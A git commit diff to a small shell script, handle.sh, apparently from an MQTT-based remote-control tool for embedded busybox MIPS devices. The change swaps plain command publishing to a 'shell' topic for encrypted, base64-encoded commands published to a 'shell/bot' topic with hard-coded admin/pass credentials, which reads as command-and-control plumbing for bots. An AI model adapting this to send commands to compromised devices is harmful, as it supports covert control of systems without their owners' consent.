a2225ea6a6312b0dc9c863e8e40ac6028c789f25
Shellz <isdrupter@users.noreply.github.com>
2016-05-14 17:50:34 -0500

    Update handle.sh

--- scripts/mqtte/handle.sh
+++ scripts/mqtte/handle.sh
@@ -1,9 +1,8 @@
 #!/bin/sh
 
-cmds=$@
-host=example.com
-shell=/var/busybox-mips
+host=127.0.0.1
+key=/tmp/.key
+echo $@ |fenc e $key |base64|tr --delete "\n" > /tmp/send.tmp
+mosquitto_pub -h $host -t shell/bot -u admin -P pass -f /tmp/send.tmp
 
-
-mosquitto_pub -h $host -r shell -m "$shell $cmds"
 exit
